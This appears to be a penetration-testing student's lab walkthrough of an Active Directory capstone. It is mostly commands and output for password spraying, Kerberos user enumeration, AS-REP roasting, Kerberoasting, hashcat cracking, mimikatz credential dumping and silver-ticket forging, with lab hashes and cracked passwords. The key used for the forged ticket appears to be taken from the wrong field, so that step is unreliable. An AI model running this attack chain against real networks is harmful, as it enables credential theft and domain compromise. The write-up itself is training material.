# PEN-200: Attacking Active Directory Authentication : Capstone VM Group 3

## Capstone VM Group 3

### List of machines

.70 : dc1

.72 : web04

.73 : files04

.74 : client74

.75 : client75

### Password spray VimForPowerShell123! (success for meg)

```
cat vmgroup3.lst                                                       
test
meg
backupuser

crackmapexec smb 192.168.152.70 -u vmgroup3.lst -p VimForPowerShell123!
SMB         192.168.152.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.152.70  445    DC1              [-] corp.com\test:VimForPowerShell123! STATUS_LOGON_FAILURE 
SMB         192.168.152.70  445    DC1              [+] corp.com\meg:VimForPowerShell123! 
```

### Try to connect using RDP (All failed)

```
xfreerdp /d:"corp.com" /u:"meg" /p:"VimForPowerShell123\!" /v:"192.168.152.72" /cert-ignore
xfreerdp /d:"corp.com" /u:"meg" /p:"VimForPowerShell123\!" /v:"192.168.152.73" /cert-ignore
xfreerdp /d:"corp.com" /u:"meg" /p:"VimForPowerShell123\!" /v:"192.168.152.74" /cert-ignore
xfreerdp /d:"corp.com" /u:"meg" /p:"VimForPowerShell123\!" /v:"192.168.152.75" /cert-ignore
```

### Pre-auth Userenum

```
kerbrute userenum -d corp.com --dc 192.168.152.70 /opt/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_ad_users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/12/24 - Ronnie Flathers @ropnop

2024/09/12 09:02:53 >  Using KDC(s):
2024/09/12 09:02:53 >  	192.168.152.70:88

2024/09/12 09:02:53 >  [+] VALID USERNAME:	 dave@corp.com
2024/09/12 09:02:53 >  [+] VALID USERNAME:	 jeff@corp.com
2024/09/12 09:02:55 >  [+] VALID USERNAME:	 pete@corp.com
2024/09/12 09:03:01 >  [+] VALID USERNAME:	 Dave@corp.com
2024/09/12 09:03:03 >  [+] VALID USERNAME:	 administrator@corp.com
2024/09/12 09:03:05 >  [+] VALID USERNAME:	 stephanie@corp.com
2024/09/12 09:03:11 >  [+] VALID USERNAME:	 Jeff@corp.com
2024/09/12 09:03:21 >  [+] VALID USERNAME:	 DAVE@corp.com
2024/09/12 09:03:32 >  [+] VALID USERNAME:	 Pete@corp.com
2024/09/12 09:03:38 >  [+] VALID USERNAME:	 JEFF@corp.com
2024/09/12 09:03:46 >  [+] VALID USERNAME:	 jen@corp.com
2024/09/12 09:03:47 >  [+] VALID USERNAME:	 Stephanie@corp.com

```

### Users enumeration

```
crackmapexec smb 192.168.152.70 -u meg -p VimForPowerShell123! --users
SMB         192.168.152.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.152.70  445    DC1              [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.152.70  445    DC1              [*] Trying to dump local users with SAMRPC protocol
SMB         192.168.152.70  445    DC1              [+] Enumerated domain user(s)
SMB         192.168.152.70  445    DC1              corp.com\Administrator                  Built-in account for administering the computer/domain
SMB         192.168.152.70  445    DC1              corp.com\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.152.70  445    DC1              corp.com\krbtgt                         Key Distribution Center Service Account
SMB         192.168.152.70  445    DC1              corp.com\dave                           
SMB         192.168.152.70  445    DC1              corp.com\stephanie                      
SMB         192.168.152.70  445    DC1              corp.com\jeff                           
SMB         192.168.152.70  445    DC1              corp.com\jeffadmin                      
SMB         192.168.152.70  445    DC1              corp.com\iis_service                    
SMB         192.168.152.70  445    DC1              corp.com\pete                           
SMB         192.168.152.70  445    DC1              corp.com\jen                            
SMB         192.168.152.70  445    DC1              corp.com\meg                            
SMB         192.168.152.70  445    DC1              corp.com\backupuser  
```

### Groups enumeration

```
crackmapexec smb 192.168.152.70 -u meg -p VimForPowerShell123! --groups
SMB         192.168.152.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.152.70  445    DC1              [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.152.70  445    DC1              [+] Enumerated domain group(s)
SMB         192.168.152.70  445    DC1              Debug                                    membercount: 0
SMB         192.168.152.70  445    DC1              Development Department                   membercount: 3
SMB         192.168.152.70  445    DC1              Management Department                    membercount: 1
SMB         192.168.152.70  445    DC1              Sales Department                         membercount: 3
SMB         192.168.152.70  445    DC1              DnsUpdateProxy                           membercount: 0
SMB         192.168.152.70  445    DC1              DnsAdmins                                membercount: 0
SMB         192.168.152.70  445    DC1              Enterprise Key Admins                    membercount: 0
SMB         192.168.152.70  445    DC1              Key Admins                               membercount: 0
SMB         192.168.152.70  445    DC1              Protected Users                          membercount: 0
SMB         192.168.152.70  445    DC1              Cloneable Domain Controllers             membercount: 0
SMB         192.168.152.70  445    DC1              Enterprise Read-only Domain Controllers  membercount: 0
SMB         192.168.152.70  445    DC1              Read-only Domain Controllers             membercount: 0
SMB         192.168.152.70  445    DC1              Denied RODC Password Replication Group   membercount: 8
SMB         192.168.152.70  445    DC1              Allowed RODC Password Replication Group  membercount: 0
SMB         192.168.152.70  445    DC1              Terminal Server License Servers          membercount: 0
SMB         192.168.152.70  445    DC1              Windows Authorization Access Group       membercount: 1
SMB         192.168.152.70  445    DC1              Incoming Forest Trust Builders           membercount: 0
SMB         192.168.152.70  445    DC1              Pre-Windows 2000 Compatible Access       membercount: 1
SMB         192.168.152.70  445    DC1              Account Operators                        membercount: 0
SMB         192.168.152.70  445    DC1              Server Operators                         membercount: 0
SMB         192.168.152.70  445    DC1              RAS and IAS Servers                      membercount: 0
SMB         192.168.152.70  445    DC1              Group Policy Creator Owners              membercount: 1
SMB         192.168.152.70  445    DC1              Domain Guests                            membercount: 0
SMB         192.168.152.70  445    DC1              Domain Users                             membercount: 0
SMB         192.168.152.70  445    DC1              Domain Admins                            membercount: 3
SMB         192.168.152.70  445    DC1              Cert Publishers                          membercount: 0
SMB         192.168.152.70  445    DC1              Enterprise Admins                        membercount: 1
SMB         192.168.152.70  445    DC1              Schema Admins                            membercount: 1
SMB         192.168.152.70  445    DC1              Domain Controllers                       membercount: 0
SMB         192.168.152.70  445    DC1              Domain Computers                         membercount: 0
SMB         192.168.152.70  445    DC1              Storage Replica Administrators           membercount: 0
SMB         192.168.152.70  445    DC1              Remote Management Users                  membercount: 0
SMB         192.168.152.70  445    DC1              Access Control Assistance Operators      membercount: 0
SMB         192.168.152.70  445    DC1              Hyper-V Administrators                   membercount: 0
SMB         192.168.152.70  445    DC1              RDS Management Servers                   membercount: 0
SMB         192.168.152.70  445    DC1              RDS Endpoint Servers                     membercount: 0
SMB         192.168.152.70  445    DC1              RDS Remote Access Servers                membercount: 0
SMB         192.168.152.70  445    DC1              Certificate Service DCOM Access          membercount: 0
SMB         192.168.152.70  445    DC1              Event Log Readers                        membercount: 0
SMB         192.168.152.70  445    DC1              Cryptographic Operators                  membercount: 0
SMB         192.168.152.70  445    DC1              IIS_IUSRS                                membercount: 1
SMB         192.168.152.70  445    DC1              Distributed COM Users                    membercount: 0
SMB         192.168.152.70  445    DC1              Performance Log Users                    membercount: 0
SMB         192.168.152.70  445    DC1              Performance Monitor Users                membercount: 0
SMB         192.168.152.70  445    DC1              Network Configuration Operators          membercount: 0
SMB         192.168.152.70  445    DC1              Remote Desktop Users                     membercount: 0
SMB         192.168.152.70  445    DC1              Replicator                               membercount: 0
SMB         192.168.152.70  445    DC1              Backup Operators                         membercount: 0
SMB         192.168.152.70  445    DC1              Print Operators                          membercount: 0
SMB         192.168.152.70  445    DC1              Guests                                   membercount: 2
SMB         192.168.152.70  445    DC1              Users                                    membercount: 3
SMB         192.168.152.70  445    DC1              Administrators                           membercount: 4
```

### ASREPRoasting (Success obtained dave TGT)

```
GetNPUsers.py -dc-ip 192.168.152.70  -request -outputfile hashes.asreproast corp.com/meg 
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 16:54:57.521205  2024-09-12 09:06:28.635877  0x410200 



$krb5asrep$23$dave@CORP.COM:6802196686885aee731ff35c1b5386f3$ad5b892169cd4e9c88decf7c8c44b7447355acb77adc1d8feb3c782b229b23a3f5f25f92659eaafb90f7156ae6b71eb7c2baf3735db8b183547ac71d47e3e830ed1a7b514c01b902a398eb519ddaca4a2d3a6a76a9085216c9e4517ad0050b9b5bb546d83b0b29b8be5fb8ea84e887fb8a0202bc887848a3fd97a89a5d0231e5153f5c27d7e7ec2a7794840c72cb421b66349f4752cee71a55b762f4d0d1271691a6e955eff8330990434c084d6b07157c12b35e96d0897389d1cbf1f28ad4a33811ac77eef38b45c3b3893f4fed3dce69f826fccaf7be57a3fd46adf7d94c1369d6f5c7
```

### Crack dave password offline (Success : Flowers1)

```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

$krb5asrep$23$dave@CORP.COM:6802196686885aee731ff35c1b5386f3$ad5b892169cd4e9c88decf7c8c44b7447355acb77adc1d8feb3c782b229b23a3f5f25f92659eaafb90f7156ae6b71eb7c2baf3735db8b183547ac71d47e3e830ed1a7b514c01b902a398eb519ddaca4a2d3a6a76a9085216c9e4517ad0050b9b5bb546d83b0b29b8be5fb8ea84e887fb8a0202bc887848a3fd97a89a5d0231e5153f5c27d7e7ec2a7794840c72cb421b66349f4752cee71a55b762f4d0d1271691a6e955eff8330990434c084d6b07157c12b35e96d0897389d1cbf1f28ad4a33811ac77eef38b45c3b3893f4fed3dce69f826fccaf7be57a3fd46adf7d94c1369d6f5c7:Flowers1
                                                          
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

### Validate dave credentials

```
crackmapexec smb 192.168.152.70 -u dave -p Flowers1                                                                          
SMB         192.168.152.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.152.70  445    DC1              [+] corp.com\dave:Flowers1 
```

### Try to connect using RDP with dave creds (Ok on .74 & .75)

```
xfreerdp /d:"corp.com" /u:"dave" /p:"Flowers1" /v:"192.168.152.70" /cert-ignore 
xfreerdp /d:"corp.com" /u:"dave" /p:"Flowers1" /v:"192.168.152.72" /cert-ignore 
xfreerdp /d:"corp.com" /u:"dave" /p:"Flowers1" /v:"192.168.152.73" /cert-ignore 
xfreerdp /d:"corp.com" /u:"dave" /p:"Flowers1" /v:"192.168.152.74" /cert-ignore 
xfreerdp /d:"corp.com" /u:"dave" /p:"Flowers1" /v:"192.168.152.75" /cert-ignore 

```

### Get all accounts with SPNs

```
GetUserSPNs.py -dc-ip 192.168.152.70 corp.com/meg              
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
ServicePrincipalName    Name         MemberOf                                  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  ----------------------------------------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04              iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
http/files04.corp.com   backupuser   CN=Domain Admins,CN=Users,DC=corp,DC=com  2024-09-12 08:40:56.682731  <never> 
```

### Gather all TGS

```
GetUserSPNs.py -dc-ip 192.168.152.70 corp.com/dave -request -outputfile all_tgs
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
ServicePrincipalName    Name         MemberOf                                  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  ----------------------------------------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04              iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service                                            2022-09-07 12:38:43.411468  2023-03-01 11:40:02.088156  unconstrained 
http/files04.corp.com   backupuser   CN=Domain Admins,CN=Users,DC=corp,DC=com  2024-09-12 08:40:56.682731  <never>                                   



[-] CCache file is not found. Skipping...

cat all_tgs                                        
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$3f0fee80597ecec6a33be761250a76bb$d6753a3d29e8a2f213c71a5a20b080036adcbcb0dc1493f4e535ebec14b3c52cf74d59ec04d0844b12b0ce29278883631336de0637feb4abab72725523fb092de9a4eaa56f141f43c1ca325ae5febfb8655774355836328d8c0c3ca449edf202385c300b2bf8508c23b748f4e1af0ade39c401b0f8a07f527ee094920f9130c23d4894c05e7fd0afc55cae7a563ad89a9bd198c985262c7d2b3b805fc15c277c2cfd2ddcb67041333d9cea9d91d8e7d7311fbe0a485b6598cfccbfa498f2c6e36412edce676840b75224d0eaa8e13fdf18c832ac09c37571622855ede817811e927b29d756218342cc39785889118ca15c3fd6a3f6866bf91db8b8a46031f2f8b7239cbbd7756263b0bdf4ca2e9cc982440d691e2b92d6a9e7971311194b4aa94c12d34679d3169d59b8a1e1d03a3baf2c6314c5a3940dd659bb71c6f93a4586bc6c03a0a68ebec248920591ece41d621fc7d2abbe05db2087eba408101902c6f24fb273c996bd2bda5c4f32148784ff37460a02bab010e0b354b4037b8d7482e77cbef4538c375a61a31d2ea84abd31381a66e648b898ecc882ac125472ce27b5ce7fe47bc63b4258d51e637bfc59ebf9d6440cf08a6d380acaab53ed9dc65bbdc363cb36a6edc78938d9f5e01d3f8c0445b93f7e46a2bfaa739ab2e63b5fb71d3d394cc1c28c5c90792eab3f79ce5b4e113ab2d01e4cc6eb7b5228612f7477fc5bc253567ed89ecf09563d2229d86f4630cedb40c39c5bd64227f7ec0cd1cff4a09b8b7acac8b29fd5ba4cc6207d2b92fe1e5ec2d4f1a0affd6edda262e6e1adb275da02fd329368ad23a22b5ae9af6aa22346c73ad310e6ccc22ec2a7a51a652f630f7fe9f995aedb89fca822610595e0190207fcb77a50045dd20afd7353a1f61349fee91ece138ec82d6ca8c79f17c248174473371e8c64f01523d1408b7f808a8cc5120d824c7b11875049052324828efb73ed7a78489113276ee15e71fef4f10c632f83be445875f6081adef43757a70736e381591f40810a9f3561a434736b0ca436410fb871ce49736e26730695c77363ce23c8c305958336299b96dd36e2a6eabea7f56fa1ee05f407156c683bf1fbce9b0e3c64dc44eb62f5c44e80034ab58e76a7370d0e44b5561427f8350dfda9661954645f7e678f9166a292924b9bc2aab4c552516801e137ef950d774f223a81e214d2f58cfc87ab3838d990c03fd234bad86baf08b3855f74fc77ac0b905fc2cc6ac391e2176ac6d56a79ec6f1f4f92ed0e3b8c64c42b0d9c5977577e2ca12c85b3d533323124a82aebfe8ff4bf98879ec521edb36b88031b527a3963d9d711839b0cffb3f9747a
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$8672fb194f240e51d8250da32aafadd9$4a4c777f6fd89aa7eac6280bf336705083f24f83196b447cbf0c96eef98ef00027ff2db43b6b7bda019a8815f1eb3722cbc0831e4f7dcb45f2988e84a1a7c0a27b3ebfd52d2e4a51c8e9577ddfadeaf23c9f4f0c9691af87312cb34b8bc80c8647875d4f95f48b8998fa87eeccbcb6d3c18639f6c9290c6105edca60110a88725374fd6e6613dd27b027759cbbc1a9dbfc57ed94ec79d848ee0a832fcd3d96dd1fafebf7352d716ecd652973527cbed00199ce0a20ac06c9e257b80ffc596688f360be95ae2d8459aa87d411994fa539796a4a5b548ca521efacf3efe3c21e1f2772bde175b734b305c01760c9fa47ee9b44747bff879de4d5aff4a200a57e863f2bee6161a7f6b938d99e7fe566941da0f19fb03af98600784421613e6163f352595221a74e47e724a0c58a4abcfb981d0756f608e7ea627275de66b53312010d9ba35cba524d3ed74824a6cd27b0c1b92d56c5dc4c59365893e6d8a27132ecad59ec65d4553735183ce8f639a8a398ee186f6ec75012d6b5c6636cec13c09da3f221263234574ddbe3b91b5ef4a767f8a6ddb6a7bd857a068219bacb4b48496e84958753748a67aa01302557d94bf2ce99cf7c8aa499fe0a546f729995d44478be6583db30a501b2d5e5c45ab5623af1ce136ad57a5cf2938e67097610851ed8d0dfc45bbea552488dc7a5b3d0f4faeeedb09eb595c3bf6a6d7e37a3122b56de819c73707c6c2da73918264449aea6740de3898a553e7d944964946684d8ebc6c30b1f72abca0f30fe88419dbd8330fb6d41db4c3fb4269e7a141e35623efc25619dee64ca352865e39a8f7a5600b4dd24c294e06f66d75786062751e56c743cc2933f2fb482f2e3dcd1e4a81f71d5a9e74b6151243a36c2a19645ea038a64940856ead7acba79bcd5b47736030d88e73ea7705065344b299f3747ae03cab47b79b7600b1c6e54a04b8bca75116dc9c98952e97679fa3f50d81b212295a15aee5c6cd5b95f7dcb8db11e1199146a98d6e07202d5dada40eccdb38284fbe6dec30a12199a5a67fa11e620daf3a735dd9b7061450f1e799cdfa9d165ccaca5e1dc0660ac7622cf4004c2d7d405547fc232d09873b515f75e524730819de210dbb3c1278763a86e62b11f1c0078a8678b138bcf640458fb042ff7d042a770d7b39f19bc68e30eb65958be8526a1f50a9fcac34f183ec97491e49b79fee7645bfa6a442d66845bfc3202c2a59e9fd6f8577533e2fe9d27955b514b21513fb20b3eac300ee691da42727e6490ad79789968b8a3ce6ff3ae414d8cc1535b7c3cdbad6b4d3408d5785c68123a49a5a84226182c005c353c45169727ba05e352
```

### Crack TGS offline (success : iis\_service ; Strawberry1)

```
sudo hashcat -m 13100 all_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$3f0fee80597ecec6a33be761250a76bb$d6753a3d29e8a2f213c71a5a20b080036adcbcb0dc1493f4e535ebec14b3c52cf74d59ec04d0844b12b0ce29278883631336de0637feb4abab72725523fb092de9a4eaa56f141f43c1ca325ae5febfb8655774355836328d8c0c3ca449edf202385c300b2bf8508c23b748f4e1af0ade39c401b0f8a07f527ee094920f9130c23d4894c05e7fd0afc55cae7a563ad89a9bd198c985262c7d2b3b805fc15c277c2cfd2ddcb67041333d9cea9d91d8e7d7311fbe0a485b6598cfccbfa498f2c6e36412edce676840b75224d0eaa8e13fdf18c832ac09c37571622855ede817811e927b29d756218342cc39785889118ca15c3fd6a3f6866bf91db8b8a46031f2f8b7239cbbd7756263b0bdf4ca2e9cc982440d691e2b92d6a9e7971311194b4aa94c12d34679d3169d59b8a1e1d03a3baf2c6314c5a3940dd659bb71c6f93a4586bc6c03a0a68ebec248920591ece41d621fc7d2abbe05db2087eba408101902c6f24fb273c996bd2bda5c4f32148784ff37460a02bab010e0b354b4037b8d7482e77cbef4538c375a61a31d2ea84abd31381a66e648b898ecc882ac125472ce27b5ce7fe47bc63b4258d51e637bfc59ebf9d6440cf08a6d380acaab53ed9dc65bbdc363cb36a6edc78938d9f5e01d3f8c0445b93f7e46a2bfaa739ab2e63b5fb71d3d394cc1c28c5c90792eab3f79ce5b4e113ab2d01e4cc6eb7b5228612f7477fc5bc253567ed89ecf09563d2229d86f4630cedb40c39c5bd64227f7ec0cd1cff4a09b8b7acac8b29fd5ba4cc6207d2b92fe1e5ec2d4f1a0affd6edda262e6e1adb275da02fd329368ad23a22b5ae9af6aa22346c73ad310e6ccc22ec2a7a51a652f630f7fe9f995aedb89fca822610595e0190207fcb77a50045dd20afd7353a1f61349fee91ece138ec82d6ca8c79f17c248174473371e8c64f01523d1408b7f808a8cc5120d824c7b11875049052324828efb73ed7a78489113276ee15e71fef4f10c632f83be445875f6081adef43757a70736e381591f40810a9f3561a434736b0ca436410fb871ce49736e26730695c77363ce23c8c305958336299b96dd36e2a6eabea7f56fa1ee05f407156c683bf1fbce9b0e3c64dc44eb62f5c44e80034ab58e76a7370d0e44b5561427f8350dfda9661954645f7e678f9166a292924b9bc2aab4c552516801e137ef950d774f223a81e214d2f58cfc87ab3838d990c03fd234bad86baf08b3855f74fc77ac0b905fc2cc6ac391e2176ac6d56a79ec6f1f4f92ed0e3b8c64c42b0d9c5977577e2ca12c85b3d533323124a82aebfe8ff4bf98879ec521edb36b88031b527a3963d9d711839b0cffb3f9747a:Strawberry1
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts

```

### Validate iis\_service credentials

```
crackmapexec smb 192.168.152.70 -u iis_service -p Strawberry1
SMB         192.168.152.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.152.70  445    DC1              [+] corp.com\iis_service:Strawberry1 
```

### Silver Ticket

#### Try to access services with Dave account

```
evil-winrm -i 192.168.213.74 -u Dave -p Flowers1           

                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\dave\Documents> whoami
corp\dave
*Evil-WinRM* PS C:\Users\dave\Documents> iwr -UseDefaultCredentials http://web04.corp.com
The remote server returned an error: (401) Unauthorized.
At line:1 char:1
+ iwr -UseDefaultCredentials http://web04.corp.com
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
*Evil-WinRM* PS C:\Users\dave\Documents> iwr -UseDefaultCredentials http://files04.corp.com
Unable to connect to the remote server
At line:1 char:1
+ iwr -UseDefaultCredentials http://files04.corp.com
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

#### Try to get SPN NTLM Hash (Failed from .74)

Dave is admin on .74

```
c:\Tools>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1237712 (00000000:0012e2d0)
Session           : RemoteInteractive from 2
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/12/2024 6:53:28 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
```

### Connect on .72 with iis\_service (OK)

```
xfreerdp /d:"corp.com" /u:"iis_service" /p:"Strawberry1" /v:"192.168.213.72" /cert-ignore

```

### Access web4 service from .72 with iis\_service (OK)

```
iwr -UseDefaultCredentials http://web04.corp.com                                                

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 729
                    Content-Type: text/html
                    Date: Fri, 20 Sep 2024 08:34:57 GMT
                    ETag: "c5de2e2793d91:0"
                    Last-Modified: Mon, 28 Nov 202...
Forms             : {}
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 729], [Content-Type,
                    text/html]...}
Images            : {@{innerHTML=; innerText=; outerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>;
                    outerText=; tagName=IMG; alt=IIS; src=iisstart.png; width=960; height=600}}
InputFields       : {}
Links             : {@{innerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>; innerText=; outerHTML=<A
                    href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><IMG alt=IIS
                    src="iisstart.png" width=960 height=600></A>; outerText=; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        : System.__ComObject
RawContentLength  : 729
```

### Generate silver ticket for dave on both web04 and files04 (don't access to files04)

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:3f0fee80597ecec6a33be761250a76bb /user:dave
User      : dave
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3f0fee80597ecec6a33be761250a76bb - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/20/2024 6:38:23 AM ; 9/18/2034 6:38:23 AM ; 9/18/2034 6:38:23 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'dave @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!

c:\Tools>klist

Current LogonId is 0:0x40821a

Cached Tickets: (1)

#0>     Client: dave @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/20/2024 6:38:23 (local)
        End Time:   9/18/2034 6:38:23 (local)
        Renew Time: 9/18/2034 6:38:23 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:files04.corp.com /service:http /rc4:3f0fee80597ecec6a33be761250a76bb /user:dave
User      : dave
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3f0fee80597ecec6a33be761250a76bb - rc4_hmac_nt
Service   : http
Target    : files04.corp.com
Lifetime  : 9/20/2024 6:42:50 AM ; 9/18/2034 6:42:50 AM ; 9/18/2034 6:42:50 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'dave @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!

c:\Tools>klist

Current LogonId is 0:0x40821a

Cached Tickets: (2)

#0>     Client: dave @ corp.com
        Server: http/files04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/20/2024 6:42:50 (local)
        End Time:   9/18/2034 6:42:50 (local)
        Renew Time: 9/18/2034 6:42:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: dave @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/20/2024 6:38:23 (local)
        End Time:   9/18/2034 6:38:23 (local)
        Renew Time: 9/18/2034 6:38:23 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

